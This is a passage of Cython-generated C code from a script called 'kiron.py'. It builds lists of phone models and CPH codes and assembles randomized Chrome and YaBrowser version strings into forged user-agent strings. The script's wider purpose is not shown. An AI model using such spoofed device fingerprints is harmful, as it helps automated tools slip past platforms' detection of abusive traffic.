  __Pyx_GIVEREF(__pyx_kp_s_Storm_9530);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 59, __pyx_kp_s_Storm_9530)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Stream);
  __Pyx_GIVEREF(__pyx_n_s_Stream);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 60, __pyx_n_s_Stream)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Stylo_2_Plus_T_Mobile);
  __Pyx_GIVEREF(__pyx_kp_s_Stylo_2_Plus_T_Mobile);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 61, __pyx_kp_s_Stylo_2_Plus_T_Mobile)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Stylus_2);
  __Pyx_GIVEREF(__pyx_kp_s_Stylus_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 62, __pyx_kp_s_Stylus_2)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_TM_4377);
  __Pyx_GIVEREF(__pyx_kp_s_TM_4377);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 63, __pyx_kp_s_TM_4377)) __PYX_ERR(0, 342, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Torch_4G_9810);
  __Pyx_GIVEREF(__pyx_kp_s_Torch_4G_9810);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 64, __pyx_kp_s_Torch_4G_9810)) __PYX_ERR(0, 342, __pyx_L1_error);
  __pyx_t_4 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_t_2};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 342, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __pyx_v_mmmm = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "kiron.py":343
 *      mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
 *      mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e','Realme','Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
 *      cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])             # <<<<<<<<<<<<<<
 *      chorom = f"Chrome/"+str(random.randrange(99,499))+".0."+str(random.randrange(1111,9999))+"."+str(random.randrange(111,999))
 *      br_virshon = f"{str(random.randrange(11,99))}.1.0.{str(random.randrange(111,999))}.00"
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 343, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 343, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(31); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 343, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_n_s_CPH1979);
  __Pyx_GIVEREF(__pyx_n_s_CPH1979);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 0, __pyx_n_s_CPH1979)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH1983);
  __Pyx_GIVEREF(__pyx_n_s_CPH1983);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 1, __pyx_n_s_CPH1983)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH1987);
  __Pyx_GIVEREF(__pyx_n_s_CPH1987);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 2, __pyx_n_s_CPH1987)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2005);
  __Pyx_GIVEREF(__pyx_n_s_CPH2005);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 3, __pyx_n_s_CPH2005)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2009);
  __Pyx_GIVEREF(__pyx_n_s_CPH2009);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 4, __pyx_n_s_CPH2009)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2015);
  __Pyx_GIVEREF(__pyx_n_s_CPH2015);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 5, __pyx_n_s_CPH2015)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2059);
  __Pyx_GIVEREF(__pyx_n_s_CPH2059);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 6, __pyx_n_s_CPH2059)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2061);
  __Pyx_GIVEREF(__pyx_n_s_CPH2061);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 7, __pyx_n_s_CPH2061)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2065);
  __Pyx_GIVEREF(__pyx_n_s_CPH2065);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 8, __pyx_n_s_CPH2065)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2069);
  __Pyx_GIVEREF(__pyx_n_s_CPH2069);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 9, __pyx_n_s_CPH2069)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2071);
  __Pyx_GIVEREF(__pyx_n_s_CPH2071);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 10, __pyx_n_s_CPH2071)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2073);
  __Pyx_GIVEREF(__pyx_n_s_CPH2073);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 11, __pyx_n_s_CPH2073)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2077);
  __Pyx_GIVEREF(__pyx_n_s_CPH2077);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 12, __pyx_n_s_CPH2077)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2091);
  __Pyx_GIVEREF(__pyx_n_s_CPH2091);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 13, __pyx_n_s_CPH2091)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2095);
  __Pyx_GIVEREF(__pyx_n_s_CPH2095);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 14, __pyx_n_s_CPH2095)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2099);
  __Pyx_GIVEREF(__pyx_n_s_CPH2099);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 15, __pyx_n_s_CPH2099)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2137);
  __Pyx_GIVEREF(__pyx_n_s_CPH2137);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 16, __pyx_n_s_CPH2137)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2139);
  __Pyx_GIVEREF(__pyx_n_s_CPH2139);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 17, __pyx_n_s_CPH2139)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2145);
  __Pyx_GIVEREF(__pyx_n_s_CPH2145);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 18, __pyx_n_s_CPH2145)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2161);
  __Pyx_GIVEREF(__pyx_n_s_CPH2161);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 19, __pyx_n_s_CPH2161)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2185);
  __Pyx_GIVEREF(__pyx_n_s_CPH2185);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 20, __pyx_n_s_CPH2185)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2201);
  __Pyx_GIVEREF(__pyx_n_s_CPH2201);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 21, __pyx_n_s_CPH2201)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH2209);
  __Pyx_GIVEREF(__pyx_n_s_CPH2209);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 22, __pyx_n_s_CPH2209)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH1801);
  __Pyx_GIVEREF(__pyx_n_s_CPH1801);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 23, __pyx_n_s_CPH1801)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH1803);
  __Pyx_GIVEREF(__pyx_n_s_CPH1803);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 24, __pyx_n_s_CPH1803)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH1805);
  __Pyx_GIVEREF(__pyx_n_s_CPH1805);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 25, __pyx_n_s_CPH1805)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH1809);
  __Pyx_GIVEREF(__pyx_n_s_CPH1809);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 26, __pyx_n_s_CPH1809)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH1827);
  __Pyx_GIVEREF(__pyx_n_s_CPH1827);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 27, __pyx_n_s_CPH1827)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH1837);
  __Pyx_GIVEREF(__pyx_n_s_CPH1837);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 28, __pyx_n_s_CPH1837)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH1851);
  __Pyx_GIVEREF(__pyx_n_s_CPH1851);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 29, __pyx_n_s_CPH1851)) __PYX_ERR(0, 343, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_CPH1853);
  __Pyx_GIVEREF(__pyx_n_s_CPH1853);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 30, __pyx_n_s_CPH1853)) __PYX_ERR(0, 343, __pyx_L1_error);
  __pyx_t_4 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_t_3};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 343, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __pyx_v_cph = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "kiron.py":344
 *      mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e','Realme','Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
 *      cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
 *      chorom = f"Chrome/"+str(random.randrange(99,499))+".0."+str(random.randrange(1111,9999))+"."+str(random.randrange(111,999))             # <<<<<<<<<<<<<<
 *      br_virshon = f"{str(random.randrange(11,99))}.1.0.{str(random.randrange(111,999))}.00"
 *      mobile = random.choice(moe)
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_randrange); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__39, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_kp_u_Chrome, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_t_1, __pyx_kp_s_0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_randrange); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__40, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_t_2, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_kp_s__11); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_randrange); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__41, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 344, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_chorom = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "kiron.py":345
 *      cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
 *      chorom = f"Chrome/"+str(random.randrange(99,499))+".0."+str(random.randrange(1111,9999))+"."+str(random.randrange(111,999))
 *      br_virshon = f"{str(random.randrange(11,99))}.1.0.{str(random.randrange(111,999))}.00"             # <<<<<<<<<<<<<<
 *      mobile = random.choice(moe)
 *      cudiua1 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+kkkkki+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) "+chorom+" YaBrowser/"+br_virshon+" SA/{str(rr(1,9))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 */
  __pyx_t_1 = PyTuple_New(4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 345, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_6 = 0;
  __pyx_t_7 = 127;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 345, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_randrange); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 345, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 345, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 345, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 345, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u_1_0);
  __pyx_t_6 += 5;
  __Pyx_GIVEREF(__pyx_kp_u_1_0);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_kp_u_1_0);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 345, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_randrange); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 345, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__41, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 345, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 345, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 345, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_7;
  __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u_00);
  __pyx_t_6 += 3;
  __Pyx_GIVEREF(__pyx_kp_u_00);
  PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_kp_u_00);
  __pyx_t_2 = __Pyx_PyUnicode_Join(__pyx_t_1, 4, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 345, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_br_virshon = ((PyObject*)__pyx_t_2);
  __pyx_t_2 = 0;

  /* "kiron.py":346
 *      chorom = f"Chrome/"+str(random.randrange(99,499))+".0."+str(random.randrange(1111,9999))+"."+str(random.randrange(111,999))
 *      br_virshon = f"{str(random.randrange(11,99))}.1.0.{str(random.randrange(111,999))}.00"
 *      mobile = random.choice(moe)             # <<<<<<<<<<<<<<
 *      cudiua1 = f"Mozilla/5.0 (Linux; arm_64; Android 10; "+kkkkki+f" Build/{str(bbbb)}) AppleWebKit/537.36 (KHTML, like Gecko) "+chorom+" YaBrowser/"+br_virshon+" SA/{str(rr(1,9))} Mobile Safari/{str(rr(511,599))}.{str(rr(30,39))}"
 *      cudiua2 = f"Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(11,19))}.{str(rr(11,59))} (KHTML, like Gecko) Version/{chorom} Safari/{str(rr(1111,7999))}.25.{str(rr(17,89))}"
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_random); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 346, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_moe); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 346, __pyx_L1_error)
